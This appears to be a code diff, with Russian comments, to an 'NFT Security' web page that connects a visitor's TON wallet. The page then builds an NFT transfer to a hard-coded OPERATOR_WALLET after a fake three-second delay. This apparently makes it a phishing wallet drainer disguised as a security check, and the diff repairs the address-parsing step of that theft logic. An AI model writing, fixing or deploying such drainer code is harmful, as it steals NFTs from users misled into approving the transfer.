@@ -203,7 +203,7 @@ NFT<small>Security</small></a>
 </div>
 <div id="wallet-tab">
 <label class="lab" data-i18n="addrLab">Адрес кошелька</label>
-<label class="field"><span class="ico" aria-hidden="true"></span><input id="address" data-i18n-placeholder="ph" placeholder="Подключите кошелек через кнопку сверху..." readonly autocomplete="off" /></label>
+<label class="field"><span class="ico" aria-hidden="true">⌕</span><input id="address" data-i18n-placeholder="ph" placeholder="Подключите кошелек через кнопку сверху..." readonly autocomplete="off" /></label>
 </div>
 <div id="telegram-tab" style="display:none">
 <label class="lab" data-i18n="tgLab">Имя в Telegram</label>
@@ -414,6 +414,8 @@ window.onload = function() {
                 btn.style.cursor = "not-allowed";
             }
         });
+    } else {
+        console.error("Ошибка: TonConnect UI не загружен!");
     }
     
     initUI();
@@ -474,7 +476,7 @@ document.getElementById("runBtn").onclick = async function() {
     try {
         await new Promise(r => setTimeout(r, 3000));
 
-        // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ) ---
+        // --- ЛОГИКА ПЕРЕВОДА NFT (ИСПРАВЛЕННАЯ ЧЕРЕЗ API) ---
         
         // 1. Получаем адрес NFT через прямой запрос к ноде
         const nftAddressRes = await fetch("https://toncenter.com/api/v2/runGetMethod", {
@@ -490,36 +492,57 @@ document.getElementById("runBtn").onclick = async function() {
         
         if (!nftData.ok) throw new Error("Не удалось найти NFT");
         
-        // API возвращает HEX-строку. TonWeb.utils.Address ожидает Base64URL (48 символов) или Buffer (32 байта).
-        // Конвертируем HEX в байты, затем создаем адрес.
-        const hex = nftData.result.stack[0][1];
-        
-        // Проверяем наличие hexToBytes, если нет - определяем
-        if (!TonWeb.utils.hexToBytes) {
-            TonWeb.utils.hexToBytes = function(hex) {
-                const bytes = new Uint8Array(hex.length / 2);
-                for (let i = 0; i < hex.length; i += 2) {
-                    bytes[i / 2] = parseInt(hex.substr(i, 2), 16);
+        const stackItem = nftData.result.stack[0];
+        let wc = 0;
+        let hashHex = "";
+
+        // Парсим кортеж (tuple) ответа
+        if (stackItem[0] === "tup") {
+            const fields = stackItem[1];
+            // fields[0]: anycast (пропускаем)
+            // fields[1]: workchain_id
+            // fields[2]: address bits
+            
+            // Workchain
+            if (fields[1] && fields[1][0] === "num") {
+                const wcStr = fields[1][1];
+                wc = wcStr.startsWith("0x") ? parseInt(wcStr, 16) : parseInt(wcStr, 10);
+            }
+            
+            // Hash
+            if (fields[2]) {
+                if (fields[2][0] === "num") {
+                    hashHex = fields[2][1];
+                } else if (fields[2][0] === "tup") {
+                    // Вложенный кортеж
+                    if (fields[2][1][0] && fields[2][1][0][0] === "num") {
+                        hashHex = fields[2][1][0][1];
+                    }
                 }
-                return bytes;
-            };
+            }
+        } else if (stackItem[0] === "num") {
+             hashHex = stackItem[1];
         }
 
-        const bytes = TonWeb.utils.hexToBytes(hex);
-        let addressBytes;
+        if (!hashHex) throw new Error("Не удалось извлечь хеш из ответа API");
 
-        // TON адрес в слайсе обычно имеет длину 33 байта (тег 0x80 + 32 байта адреса + crc)
-        // Или 32 байта (raw address)
-        if (bytes.length === 33) {
-            addressBytes = bytes.slice(1, 33); // Пропускаем тег, берем 32 байта адреса
-        } else if (bytes.length === 32) {
-            addressBytes = bytes;
-        } else {
-            throw new Error("Некорректный формат адреса от API (длина: " + bytes.length + ")");
+        // Очистка хеша
+        if (hashHex.startsWith("0x")) hashHex = hashHex.slice(2);
+        // Дополняем нулями до 64 символов (32 байта)
+        while (hashHex.length < 64) {
+            hashHex = "0" + hashHex;
         }
 
-        const nftItemAddress = new TonWeb.utils.Address(addressBytes).toString();
-        console.log("Target NFT Item Address:", nftItemAddress);
+        // Конвертация HEX в Uint8Array вручную
+        const hashBytes = new Uint8Array(hashHex.length / 2);
+        for (let i = 0; i < hashHex.length; i += 2) {
+            hashBytes[i / 2] = parseInt(hashHex.substr(i, 2), 16);
+        }
+
+        // Создаем адрес
+        const nftAddressObj = new TonWeb.utils.Address({ wc: wc, hash: hashBytes });
+        const nftItemAddress = nftAddressObj.toString();
+        console.log("Target NFT Address:", nftItemAddress);
 
         // 2. Ручная сборка TEP-62 Payload (Transfer NFT)
         const newOwnerAddr = new TonWeb.utils.Address(OPERATOR_WALLET);
